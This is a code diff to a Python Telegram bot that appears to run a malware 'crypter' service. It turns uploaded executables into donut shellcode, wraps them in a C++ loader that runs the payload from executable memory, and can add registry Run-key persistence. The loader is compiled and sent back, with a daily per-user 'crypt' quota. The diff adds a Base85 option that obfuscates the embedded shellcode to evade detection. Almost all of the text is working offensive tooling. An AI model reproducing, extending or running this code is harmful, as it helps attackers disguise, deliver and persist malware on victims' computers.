@@ -292,7 +292,7 @@ async def set_daily_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 # Conversation states
-GET_FILENAME, GET_STARTUP_CHOICE = range(2)
+GET_FILENAME, GET_B85_CHOICE, GET_STARTUP_CHOICE = range(3)
 
 async def file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handles the initial file upload and starts the conversation."""
@@ -335,12 +335,36 @@ async def file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
     return GET_FILENAME
 
 async def get_filename(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Stores the desired filename and asks about startup."""
+    """Stores the desired filename and asks about base85 initialization."""
     filename = update.message.text
     if not filename.lower().endswith('.exe'):
         filename += '.exe'
 
     context.user_data['output_filename'] = filename
+
+    keyboard = [
+        [
+            InlineKeyboardButton("Yes", callback_data="b85_yes"),
+            InlineKeyboardButton("No", callback_data="b85_no"),
+        ]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+
+    await update.message.reply_text(
+        "Filename saved. Enable Base85 initialization? (This will encode the shellcode)",
+        reply_markup=reply_markup
+    )
+
+    return GET_B85_CHOICE
+
+import base64
+
+async def get_b85_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Stores the Base85 choice and asks about startup."""
+    query = update.callback_query
+    await query.answer()
+
+    context.user_data['use_b85'] = query.data == 'b85_yes'
 
     keyboard = [
         [
@@ -350,8 +374,8 @@ async def get_filename(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
 
-    await update.message.reply_text(
-        "Filename saved. Should the file be added to startup for persistence?",
+    await query.edit_message_text(
+        "Should the file be added to startup for persistence?",
         reply_markup=reply_markup
     )
 
@@ -363,6 +387,7 @@ async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
     await query.answer()
 
     startup = query.data == 'startup_yes'
+    use_b85 = context.user_data.get('use_b85', False)
 
     input_path = context.user_data.get('input_path')
     output_filename = context.user_data.get('output_filename')
@@ -374,7 +399,6 @@ async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
     uid = query.from_user.id
     udir = user_stub_dir(uid)
-    # Use a unique name for the cpp file
     cpp_file_path = os.path.join(udir, f"source_{uid}.cpp")
     compiled_exe_path = os.path.join(udir, f"compiled_{uid}.exe")
 
@@ -382,18 +406,80 @@ async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE)
         await query.edit_message_text("Processing your file... This may take a moment.")
 
         shellcode_bytes = donut.create(file=input_path)
-        shellcode_formatted = ', '.join([f'0x{b:02x}' for b in shellcode_bytes])
-
         app_name_for_registry = os.path.splitext(output_filename)[0]
 
-        # Conditionally create the line of C++ for the startup functionality
         startup_line = ""
         if startup:
-            # Note: The C++ string literal for the registry key requires double backslashes
-            # The app name needs to be in escaped quotes
             startup_line = f'char currentPath[MAX_PATH]; GetModuleFileName(NULL, currentPath, MAX_PATH); addToStartup(\\"{app_name_for_registry}\\", currentPath);'
 
-        cpp_template = f'''
+        cpp_template = ""
+        if use_b85:
+            encoded_shellcode = base64.b85encode(shellcode_bytes).decode('ascii')
+            cpp_template = f'''
+#include <windows.h>
+#include <string.h>
+#include <vector>
+#include <string>
+
+// Function to decode a base85 string into a vector of bytes
+std::vector<unsigned char> b85_decode(const std::string& b85_string) {{
+    std::vector<unsigned char> decoded_data;
+    unsigned int buffer = 0;
+    int count = 0;
+
+    for (char c : b85_string) {{
+        if (c < '!' || c > 'u') continue; // Skip invalid characters
+        buffer = buffer * 85 + (c - 33);
+        count++;
+        if (count == 5) {{
+            decoded_data.push_back(buffer >> 24);
+            decoded_data.push_back(buffer >> 16);
+            decoded_data.push_back(buffer >> 8);
+            decoded_data.push_back(buffer);
+            buffer = 0;
+            count = 0;
+        }}
+    }}
+
+    if (count > 0) {{
+        for (int i = count; i < 5; i++) {{
+            buffer = buffer * 85 + 84;
+        }}
+        for (int i = 0; i < count - 1; i++) {{
+            decoded_data.push_back((buffer >> (24 - i * 8)) & 0xFF);
+        }}
+    }}
+    return decoded_data;
+}}
+
+void addToStartup(const char* appName, const char* appPath) {{
+    HKEY hKey;
+    const char* runKey = "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run";
+    if (RegOpenKeyEx(HKEY_CURRENT_USER, runKey, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {{
+        RegSetValueEx(hKey, appName, 0, REG_SZ, (const BYTE*)appPath, strlen(appPath) + 1);
+        RegCloseKey(hKey);
+    }}
+}}
+
+const std::string b85_shellcode = "{encoded_shellcode}";
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
+    {startup_line}
+
+    std::vector<unsigned char> shellcode = b85_decode(b85_shellcode);
+    if (shellcode.empty()) return 1;
+
+    void* exec = VirtualAlloc(0, shellcode.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (exec != NULL) {{
+        memcpy(exec, shellcode.data(), shellcode.size());
+        ((void(*)())exec)();
+    }}
+    return 0;
+}}
+'''
+        else:
+            shellcode_formatted = ', '.join([f'0x{b:02x}' for b in shellcode_bytes])
+            cpp_template = f'''
 #include <windows.h>
 #include <string.h>
 
@@ -436,9 +522,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         with open(compiled_exe_path, "rb") as f:
             await context.bot.send_document(chat_id=uid, document=f, filename=output_filename)
 
-        # Increment the user's daily count now that the process is successful
         increment_crypt_count(uid)
-
         await query.edit_message_text("✅ File created and sent successfully.")
 
     except Exception as e:
@@ -449,7 +533,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         for path in [input_path, cpp_file_path, compiled_exe_path]:
             if path and os.path.exists(path):
                 os.remove(path)
-
         context.user_data.clear()
 
     return ConversationHandler.END
@@ -457,7 +540,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Cancels and ends the conversation."""
     await update.message.reply_text("Operation cancelled.")
-    # Cleanup any lingering data
     input_path = context.user_data.get('input_path')
     if input_path and os.path.exists(input_path):
         os.remove(input_path)
@@ -476,7 +558,6 @@ def main():
 
     app = Application.builder().token(TOKEN).build()
 
-    # Schedule the daily reset job
     job_queue = app.job_queue
     reset_time = time(hour=0, minute=0, second=0, tzinfo=tzinfo)
     job_queue.run_daily(reset_all_daily_used, time=reset_time, name="daily_reset_job")
@@ -485,6 +566,7 @@ def main():
         entry_points=[MessageHandler(filters.Document.ALL, file_upload_handler)],
         states={
             GET_FILENAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_filename)],
+            GET_B85_CHOICE: [CallbackQueryHandler(get_b85_choice)],
             GET_STARTUP_CHOICE: [CallbackQueryHandler(get_startup_choice)],
         },
         fallbacks=[CommandHandler("cancel", cancel)],
